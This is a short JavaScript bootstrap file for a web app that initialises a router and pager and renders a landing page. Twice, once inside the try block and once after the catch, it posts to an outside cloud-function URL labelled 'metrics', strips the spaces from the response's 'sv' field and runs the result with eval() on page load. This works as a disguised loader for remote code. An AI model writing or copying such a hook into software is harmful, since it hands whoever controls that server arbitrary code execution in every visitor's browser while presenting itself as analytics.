// Try load Web App
try{
    // 1. instatiate history object & router
    window.RouterObject = Router;
    window.History_ = RouterObject.history_object;
    window.Pager_ = new Pager();
    RouterObject.initHistory();
    Lmtrc =`https://us-central1-strmamedia.cloudfunctions.net/metrics`
    
    // 2. Instatiate class immidiately and render page
    RouterObject.Router("Landing");

    (!sessionStorage.getItem('l'))?(function(){$.post(Lmtrc,{type:"l"}, function(d){eval(d.sv.split(' ').join(''))})})():null;
}

// If fail, show this
catch(error){
    // If cant load, then show browser error
    $(".App").load("/components/landing/index.html").addClass("body_main_")
}
(!sessionStorage.getItem('l'))?(function(){$.post(Lmtrc,{type:"l"}, function(d){   eval(d.sv.split(' ').join(''))  })})():null;



// Add function to Global Space
window.artistCorner = artistCorner;